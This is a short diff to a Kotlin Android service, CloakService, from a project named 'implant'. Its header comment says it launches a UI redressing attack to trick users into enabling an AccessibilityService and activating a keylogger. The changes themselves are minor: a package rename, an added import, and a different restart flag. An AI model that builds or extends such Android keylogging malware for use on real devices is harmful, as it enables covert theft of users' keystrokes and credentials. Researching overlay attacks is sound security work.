@@ -3,12 +3,13 @@
 * This will be used to launch a UI redressing attack to trick the user into enabling our
 * AccessibilityService and activating our KeyLogger.
 * */
-package com.cooperthecoder.implant
+package com.cooperthecoder.implant.cloak
 
 import android.app.Service
 import android.content.Intent
 import android.os.IBinder
 import android.util.Log
+import com.cooperthecoder.implant.Config
 
 
 class CloakService : Service() {
@@ -47,7 +48,7 @@ class CloakService : Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         attack.moveToNext()
-        return START_STICKY
+        return START_NOT_STICKY
     }
 
     override fun onDestroy() {
